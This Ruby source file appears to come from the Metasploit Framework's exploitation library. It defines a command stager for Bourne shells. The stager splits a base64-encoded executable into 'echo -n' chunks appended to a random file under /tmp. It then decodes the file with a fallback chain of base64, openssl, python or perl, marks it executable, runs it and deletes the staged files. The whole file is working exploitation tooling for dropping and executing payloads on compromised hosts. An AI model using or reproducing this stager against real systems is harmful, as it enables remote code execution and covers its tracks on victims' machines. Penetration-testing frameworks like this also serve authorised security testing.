# -*- coding: binary -*-

require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'

module Rex
module Exploitation

class CmdStagerBourne < CmdStagerBase

	def initialize(exe)
		super

		@var_encoded = Rex::Text.rand_text_alpha(5)
		@var_decoded = Rex::Text.rand_text_alpha(5)
	end

	def generate(opts = {})
		opts[:temp] = opts[:temp] || '/tmp/'
		opts[:temp] = opts[:temp].gsub(/'/, "\\\\'")
		opts[:temp] = opts[:temp].gsub(/ /, "\\ ")
		super
	end

	#
	# Override just to set the extra byte count
	#
	def generate_cmds(opts)
		# Set the start/end of the commands here (vs initialize) so we have @tempdir
		@cmd_start = "echo -n "
		@cmd_end   = ">>#{@tempdir}#{@var_encoded}.b64"
		xtra_len = @cmd_start.length + @cmd_end.length + 1
		opts.merge!({ :extra => xtra_len })
		super
	end


	#
	# Simple base64...
	#
	def encode_payload(opts)
		Rex::Text.encode_base64(@exe)
	end


	#
	# Combine the parts of the encoded file with the stuff that goes
	# before / after it.
	#
	def parts_to_commands(parts, opts)

		cmds = []
		parts.each do |p|
			cmd = ''
			cmd << @cmd_start
			cmd << p
			cmd << @cmd_end
			cmds << cmd
		end

		cmds
	end

	#
	# Generate the commands that will decode the file we just created
	#
	def generate_cmds_decoder(opts)
		decoders = [
			"base64 --decode -",
			"openssl enc -d -A -base64 -in /dev/stdin",
			"python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());'",
			"perl -MMIME::Base64 -ne 'print decode_base64($_)'"
		]
		decoder_cmd = []
		decoders.each do |cmd|
			binary = cmd.split(' ')[0]
			decoder_cmd << "(which #{binary} >&2 && #{cmd})"
		end
		decoder_cmd = decoder_cmd.join(" || ")
		decoder_cmd = "(" << decoder_cmd << ") 2> /dev/null > #{@tempdir}#{@var_decoded}.bin < #{@tempdir}#{@var_encoded}.b64"
		[ decoder_cmd ]
	end

	def compress_commands(cmds, opts)
		# Make it all happen
		cmds << "chmod +x #{@tempdir}#{@var_decoded}.bin"
		cmds << "#{@tempdir}#{@var_decoded}.bin"

		# Clean up after unless requested not to..
		if (not opts[:nodelete])
			cmds << "rm -f #{@tempdir}#{@var_decoded}.bin"
			cmds << "rm -f #{@tempdir}#{@var_encoded}.b64"
		end

		super
	end

	def cmd_concat_operator
		" ; "
	end

end
end
end
